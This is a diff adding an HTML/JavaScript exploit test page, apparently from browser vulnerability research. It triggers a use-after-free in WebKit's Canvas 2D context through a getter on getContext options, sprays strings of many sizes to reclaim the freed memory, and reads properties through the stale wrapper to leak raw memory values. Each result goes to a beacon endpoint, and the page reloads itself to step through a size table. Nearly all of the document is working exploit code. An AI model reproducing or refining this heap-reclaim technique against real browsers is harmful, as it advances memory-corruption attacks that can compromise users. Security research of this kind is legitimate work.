@@ -1,0 +1,180 @@
+<!--
+  p620v2: Canvas UAF + string-first reclaim test.
+
+  Gigacage isolates ABs, so we use WTF::StringImpl (regular bmalloc).
+  Canvas2DRenderingContext is ~768 bytes.
+
+  Strategy: spray strings FIRST (to try reclaiming freed context),
+  then canvas contexts as safety net. If string reclaims, lineWidth
+  returns garbage instead of the canvas marker 7777.77.
+
+  Test string alloc sizes near 768: 640,704,768,832,896,1024,1152,1280.
+  Also test 16-bit strings (2x content = same alloc size).
+
+  Uses localStorage for crash persistence.
+
+  CRASH_CLASS: MODERATE (has canvas safety net)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p620</title></head>
+<body><pre id="out">p620v2 canvas string-first reclaim</pre>
+<script>
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(m){
+  say(m);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P620-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2hex(f){_f64[0]=f;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/* StringImpl header ~20 bytes on 64-bit. Content length = alloc_size - 20 */
+var TESTS=[
+  /* Focus around 768 bytes - the known context size */
+  /* 8-bit strings */
+  {sz:512, len:492, w:8},
+  {sz:576, len:556, w:8},
+  {sz:640, len:620, w:8},
+  {sz:704, len:684, w:8},
+  {sz:768, len:748, w:8},
+  {sz:832, len:812, w:8},
+  {sz:896, len:876, w:8},
+  {sz:1024, len:1004, w:8},
+  {sz:1152, len:1132, w:8},
+  {sz:1280, len:1260, w:8},
+  {sz:1536, len:1516, w:8},
+  {sz:2048, len:2028, w:8},
+  /* 16-bit strings (non-ASCII forces 16-bit) */
+  {sz:512, len:246, w:16},
+  {sz:576, len:278, w:16},
+  {sz:640, len:310, w:16},
+  {sz:704, len:342, w:16},
+  {sz:768, len:374, w:16},
+  {sz:832, len:406, w:16},
+  {sz:896, len:438, w:16},
+  {sz:1024, len:502, w:16},
+  {sz:1152, len:566, w:16},
+  {sz:1280, len:630, w:16},
+  {sz:1536, len:758, w:16},
+  {sz:2048, len:1014, w:16},
+  /* Also try with StringImpl header = 24 bytes (aligned) */
+  {sz:768, len:744, w:8},
+  {sz:768, len:372, w:16},
+  {sz:832, len:808, w:8},
+  {sz:832, len:404, w:16},
+  /* Try sizes 240-480 (smaller context possible) */
+  {sz:240, len:220, w:8},
+  {sz:256, len:236, w:8},
+  {sz:288, len:268, w:8},
+  {sz:320, len:300, w:8},
+  {sz:352, len:332, w:8},
+  {sz:384, len:364, w:8},
+  {sz:416, len:396, w:8},
+  {sz:448, len:428, w:8},
+  {sz:480, len:460, w:8}
+];
+
+var CANVAS_MARKER=7777.77;
+var uid=0;
+var stringKeep=[];
+
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var stale=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    stale=c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer',opts);
+  return stale;
+}
+
+function mkStr(len, wide){
+  var s='';
+  if(wide) s='Ā'; /* force 16-bit */
+  var start=wide?1:0;
+  for(var i=start;i<len-8;i++) s+=String.fromCharCode(0x42+(i%25));
+  s+=(uid++).toString().slice(-8);
+  while(s.length<len) s+='Z';
+  return s.substring(0,len);
+}
+
+function main(){
+  var idx=0;
+  try{idx=parseInt(localStorage.getItem('p620v2_idx'))||0;}catch(e){}
+
+  if(idx>=TESTS.length){
+    bk('DONE:all-'+TESTS.length+'-tested');
+    try{localStorage.removeItem('p620v2_idx');}catch(e){}
+    return;
+  }
+
+  var t=TESTS[idx];
+  try{localStorage.setItem('p620v2_idx',String(idx+1));}catch(e){}
+
+  bk('BOOT:idx='+idx+'/'+TESTS.length);
+  bk('TESTING:sz='+t.sz+',len='+t.len+',w='+t.w);
+
+  /* Step 1: Trigger Canvas UAF */
+  var stale=triggerUAF();
+  if(!stale){bk('NO-UAF');return;}
+
+  /* Step 2: Spray strings FIRST (try to reclaim freed context) */
+  for(var i=0;i<300;i++){
+    var s=mkStr(t.len, t.w===16);
+    stringKeep.push(s);
+    var d={};d[s]=1; /* pin */
+  }
+  bk('STR-SPRAY:n=300');
+
+  /* Step 3: Canvas safety spray */
+  var sprayCtxs=[];
+  for(var i=0;i<40;i++){
+    var sc=document.createElement('canvas');
+    sc.width=1;sc.height=1;
+    var ctx=sc.getContext('2d');
+    if(ctx){ctx.lineWidth=CANVAS_MARKER;sprayCtxs.push(ctx);}
+  }
+  bk('CTX-SPRAY:n='+sprayCtxs.length);
+
+  /* Step 4: Read through stale wrapper */
+  var lw=-999;
+  try{lw=stale.lineWidth;}catch(e){
+    bk('EXCEPTION:sz='+t.sz+',err='+e.message);
+  }
+
+  if(lw===-999){
+    bk('CRASH:sz='+t.sz+' (string reclaimed, bad ptr)');
+  } else if(Math.abs(lw-CANVAS_MARKER)<0.01){
+    bk('MISS:sz='+t.sz+',lw='+lw+' (canvas won)');
+  } else if(Math.abs(lw-1.0)<0.001){
+    bk('DEFAULT:sz='+t.sz+' (freed/default)');
+  } else {
+    bk('HIT:sz='+t.sz+',lw='+lw+',hex='+f2hex(lw)+',w='+t.w);
+    try{
+      var ml=stale.miterLimit;
+      bk('HIT-ML:'+ml+',hex='+f2hex(ml));
+    }catch(e){bk('ML-ERR:'+e.message);}
+    try{
+      var ga=stale.globalAlpha;
+      bk('HIT-GA:'+ga+',hex='+f2hex(ga));
+    }catch(e){bk('GA-ERR:'+e.message);}
+    try{localStorage.setItem('p620v2_found',t.sz+'/'+t.w);}catch(e){}
+    bk('FOUND:sz='+t.sz+',w='+t.w);
+    return;
+  }
+
+  bk('NEXT:idx='+(idx+1));
+  setTimeout(function(){
+    bk('RELOAD');
+    try{location.reload();}catch(e){}
+  }, 1500);
+}
+
+setTimeout(main,100);
+</script>
+</body></html>
